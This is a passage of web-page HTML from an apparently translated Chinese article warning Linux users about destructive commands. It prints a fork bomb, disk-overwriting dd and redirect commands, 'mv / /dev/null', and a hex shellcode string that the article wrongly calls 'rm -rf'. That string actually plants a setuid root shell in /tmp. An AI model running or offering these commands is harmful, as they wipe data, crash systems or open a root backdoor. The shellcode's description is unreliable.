界工作了很多年，但是今天，作为 Linux 系统 root 用户，我在错误的系统路径运行了 <strong>rm- f</strong></p>\n<p>长话短说，那天，我需要复制一大堆目录从一个目录到另一个目录，和你一样，我敲了几个 <strong>cp -R</strong> 去复制我需要的内容。</p>\n<p>以我的聪明劲，我持续敲着上箭头，在命令记录中寻找可以复制使用的类似命令名，但是它们混杂在一大堆其他命令当中。</p>\n<p>不管怎么说，我一边在 Skype、Slack 和 WhatsApp 的网页上打字，一边又和 Sage 通电话，注意力严重分散，我在敲入 <strong>rm -R ./videodir/* ../companyvideodirwith651vidsin/</strong> 这样一条命令时神游物外。</p></blockquote>\n<p>然后，当文件化为乌有时其中也包括了公司的视频。幸运的是，在疯狂敲击 <strong>control -C</strong> 后，在删除太多文件之前，系统管理员中止了这条命令。但这是对你的警告：任何人都可能犯这样的错误。</p>\n<p>事实上，绝大部分现代操作系统都会在你犯这些错误之前，用一段醒目的文字警告你。然而，如果你在连续敲击键盘时忙碌或是分心，你将会把你的系统键入一个黑洞。（LCTT 译注：幸运的是，可能在根目录下删除整个文件系统的人太多了额，后来 <strong>rm</strong> 默认禁止删除根目录，除非——你手动加上 <strong>–no-preserve-root</strong> 参数！）</p>\n<p>这里有一些更为隐蔽的方式调用 <strong>rm -rf</strong>。思考一下下面的代码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967c08f9629782512\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchar esp[] __attribute__ ((section(“.text”))) = “\\xeb\\x3e\\x5b\\x31\\xc0\\x50\\x54\\x5a\\x83\\xec\\x64\\x68”\r\n“\\xff\\xff\\xff\\xff\\x68\\xdf\\xd0\\xdf\\xd9\\x68\\x8d\\x99”\r\n“\\xdf\\x81\\x68\\x8d\\x92\\xdf\\xd2\\x54\\x5e\\xf7\\x16\\xf7”\r\n“\\x56\\x04\\xf7\\x56\\x08\\xf7\\x56\\x0c\\x83\\xc4\\x74\\x56”\r\n“\\x8d\\x73\\x08\\x56\\x53\\x54\\x59\\xb0\\x0b\\xcd\\x80\\x31”\r\n“\\xc0\\x40\\xeb\\xf9\\xe8\\xbd\\xff\\xff\\xff\\x2f\\x62\\x69”\r\n“\\x6e\\x2f\\x73\\x68\\x00\\x2d\\x63\\x00”\r\n“cp -p /bin/sh /tmp/.beyond; chmod 4755\r\n/tmp/.beyond;”;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967c08f9629782512-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2967c08f9629782512-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2967c08f9629782512-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2967c08f9629782512-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2967c08f9629782512-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2967c08f9629782512-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2967c08f9629782512-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2967c08f9629782512-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2967c08f9629782512-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967c08f9629782512-1\"><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">esp</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">__attribute__</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">section</span><span class=\"crayon-sy\">(</span>“<span class=\"crayon-sy\">.</span><span class=\"crayon-i\">text</span>”<span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span>“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xeb</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x3e</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x5b</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x31</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xc0</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x50</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x54</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x5a</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x83</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xec</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x64</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">x68</span>”</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2967c08f9629782512-2\">“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x68</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xdf</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xd0</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xdf</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xd9</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x68</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x8d</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">x99</span>”</div><div class=\"crayon-line\" id=\"crayon-5a6f2967c08f9629782512-3\">“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xdf</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x81</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x68</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x8d</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x92</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xdf</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xd2</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x54</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x5e</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xf7</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x16</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">xf7</span>”</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2967c08f9629782512-4\">“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x56</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x04</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xf7</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x56</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x08</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xf7</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x56</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x0c</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x83</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xc4</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x74</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">x56</span>”</div><div class=\"crayon-line\" id=\"crayon-5a6f2967c08f9629782512-5\">“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x8d</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x73</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x08</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x56</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x53</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x54</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x59</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xb0</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x0b</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xcd</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x80</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">x31</span>”</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2967c08f9629782512-6\">“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xc0</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x40</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xeb</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xf9</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xe8</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xbd</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x2f</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x62</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">x69</span>”</div><div class=\"crayon-line\" id=\"crayon-5a6f2967c08f9629782512-7\">“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x6e</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x2f</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x73</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x68</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x00</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x2d</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x63</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">x00</span>”</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2967c08f9629782512-8\">“<span class=\"crayon-v\">cp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">beyond</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4755</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2967c08f9629782512-9\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">beyond</span><span class=\"crayon-sy\">;</span>”<span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0046 seconds] -->\r\n<p>这是什么？这是 16 进制的 <strong>rm -rf</strong> 写法。在你不明确这段代码之前，请千万不要运行这条命令！</p>\n<h1 id=\"toc_2\">fork 炸弹</h1>\n<p>既然我们讨论的都是些奇怪的代码，不妨思考一下这一行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967c0908148297797\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n:(){ :|: &amp; };:</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967c0908148297797-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967c0908148297797-1\"><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-o\">:</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>对你来说，这可能看起来有些神秘，但是我看来，它就是那个臭名昭著的 <a href=\"https://linux.cn/article-5685-1.html\">Bash fork 炸弹</a>。它会反复启动新的 Bash shell，直到你的系统资源消耗殆尽、系统崩溃。</p>\n<p>不应该在最新的 Linux 系统上做这些操作。注意，我说的是<strong>不应该</strong>。我没有说<strong>不能</strong>。正确设置用户权限，Linux 系统能够阻止这些破坏性行为。通常用户仅限于分配使用机器可用内存。但是如果作为 root 用户的你运行了这行命令（或者它的变体 <a href=\"https://unix.stackexchange.com/questions/283496/why-do-these-bash-fork-bombs-work-differently-and-what-is-the-significance-of\">Bash fork 炸弹变体</a>），你仍然可以反复虐待服务器，直到系统重启了。</p>\n<h1 id=\"toc_3\">垃圾数据重写硬盘</h1>\n<p>有时候你想彻底清除硬盘的数据，你应该使用 <a href=\"https://dban.org/\">Darik’s Boot and Nuke （DBAN）</a> 工具去完成这项工作。</p>\n<p>但是如果仅仅想让你的存储器乱套，那很简单：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967c090d355146060\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n任意命令 &gt; /dev/hda</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967c090d355146060-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967c090d355146060-1\">任意命令<span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">hda</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>我说的“任意命令”，是指有输出的任意命令，比如:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967c0911196880201\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nls -la &gt; /dev/hda</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967c0911196880201-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967c0911196880201-1\"><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">la</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">hda</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>……将目录列表通过管道送到你的主存储设备。给我 root 权限和足够的时间，就能覆盖整个硬盘设备。这是让你开始盲目恐慌的一天的好办法，或者，可以把它变成 <a href=\"https://www.hpe.com/us/en/insights/articles/13-ways-to-tank-your-it-career-1707.html\">职业禁入方式</a>。</p>\n<h1 id=\"toc_4\">擦除硬盘！</h1>\n<p>另一个一直受欢迎的擦除硬盘的方式是执行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967c0915311315939\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndd if=/dev/zero of=/dev/hda</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967c0915311315939-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967c0915311315939-1\"><span class=\"crayon-e\">dd </span><span class=\"crayon-st\">if</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">zero </span><span class=\"crayon-v\">of</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">hda</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>你可以用这条命令写入数据到你的硬盘设备。<strong>dd</strong> 命令可以从特殊文件中获取无尽个 <strong>0</strong> 字符，并且将它全部写入你的设备。</p>\n<p>可能现在听起来 <strong>/dev/zero</strong> 是个愚蠢的想法，但是它真的管用。比如说，你可以使用它来 <a href=\"https://unix.stackexchange.com/questions/44234/clear-unused-space-with-zeros-ext3-ext4\">用零清除未使用的分区空间</a>。它能使分区的镜像压缩到更小，以便于数据传输或是存档使用。</p>\n<p>在另一方面，它和 <strong>dd if=/dev/random of=/dev/hda</strong> 相近，除了能毁掉你的一天之外，不是一个好事。如果你运行了这个指令（千万不要），你的存储器会被随机数据覆盖。作为一个隐藏你要接管办公室咖啡机的秘密计划的半吊子方法，倒是不错，但是你可以使用 DBAN 工具去更好的完成你的任务。</p>\n<h1 id=\"toc_5\">/dev/null 的损失</h1>\n<p>也许因为数据珍贵，我们对备份的数据没有什么信心，确实很多“永远不要这样做！”的命令都会导致硬盘或其它存储仓库的数据被擦除。一个鲜明的实例：另一个毁灭你的存储设备的方式，运行 <strong>mv / /dev/null</strong> 或者 <strong>&gt;mv /dev/null</strong>。</p>\n<p>在前一种情况下，你作为 root 用户，把整个磁盘数据都送进这个如饥似渴的 <strong>/dev/null</strong>。在后者，你仅仅把家目录喂给这个空空如也的仓库。任何一种情况下，除非还原备份，你再也不会再看见你的数据了。</p>\n<p>见鬼，难道会计真的不需要最新的应收账款文件了吗？</p>\n<h1 id=\"toc_6\">格式化错了驱动器</h1>\n<p>有时候你需要使用这一条命令格式化驱动器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967c0919525661594\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px 